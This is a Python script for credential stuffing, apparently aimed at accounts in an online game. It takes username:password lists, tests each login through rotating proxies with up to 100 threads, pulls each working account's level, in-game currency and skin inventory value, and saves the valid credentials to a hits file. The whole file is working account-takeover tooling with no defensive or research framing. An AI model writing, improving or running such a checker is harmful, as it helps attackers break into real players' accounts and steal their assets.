import threading,os,random,time
from concurrent.futures import ThreadPoolExecutor as TPE
from auth import Auth
from websocket_handler import WSHandler
from utils import LA,LP
from console_output import console

results_list=[];results_lock=threading.Lock()

class K:
 def __init__(s):s.v=0;s.auth=Auth();s.ws=WSHandler()
 
 def gp(s):
  if hasattr(s,'proxies')and s.proxies:
   l=random.choice(s.proxies)
   if"@"in l:
    a,b=l.split("@");u,p=a.split(":");h,o=b.split(":");return f"http://{u}:{p}@{h}:{o}"
   else:return f"http://{l}"

 def proc(s,a):
  global results_list
  u,p=a.strip().split(":",1);st=s.auth.cl(u,p,s)
  
  with console.lk:
   console.tca += 1
   current_checked = console.tca
  
  if st in["login_ok","needs_migrate"]:
   s.v+=1
   with console.lk:
    console.tfa += 1
   
   try:
    pr=s.gp()
    if st == "login_ok":
     token = s.auth.jwt(u, p, pr)
     if token:
      profile_stats = s.ws.fetch_profile_ws(u, token, pr)
     else:
      profile_stats = s.ws.fetch_profile_ws(u, None, pr)
    else:
     profile_stats = s.ws.fetch_profile_ws(u, None, pr)
    
    if profile_stats:
     level = int((profile_stats['player_score'] / 1111.0) ** 0.5)
     kr_amount = profile_stats['player_funds']
     inv_value = profile_stats['player_skinvalue']
     
     with console.lk:
      console.tkr += kr_amount
     console.iv2(level)
     console.iv1(inv_value)
     
     L = f"{u}:{p} | user: {profile_stats['player_name']} | LVL: {level} | KR: {kr_amount} | Inv value: {inv_value}"
    else:
     L = f"{u}:{p} | Profile fetch failed"
   except Exception as e:
    L = f"{u}:{p} | Profile error: {str(e)}"
   
   with results_lock:
    results_list.append(L)
    os.makedirs("results",exist_ok=True)
    with open("results/hits.txt", "a", encoding="utf-8") as f:
     f.write(L + "\n")
  
  console.ps()

def main():
 a=LA()
 if not a:return print("No accounts found in data/accounts.txt")
 
 console.ta = len(a)
 console.tca = 0
 console.tfa = 0
 console.tkr = 0
 
 p=LP();t=input("threads (default: 100): ").strip()
 try:t=int(t);t=100 if t<=0 else t
 except:t=100
 
 console.c1(t)
 
 os.makedirs("results",exist_ok=True)
 if os.path.exists("results/hits.txt"):os.remove("results/hits.txt")

 print(f"Starting check...")
 time.sleep(2)
 
 c=K();c.proxies=p
 with TPE(max_workers=t)as ex:ex.map(c.proc,a)
 
 console.ps(fu=True)
 print("CHECKING COMPLETED!")

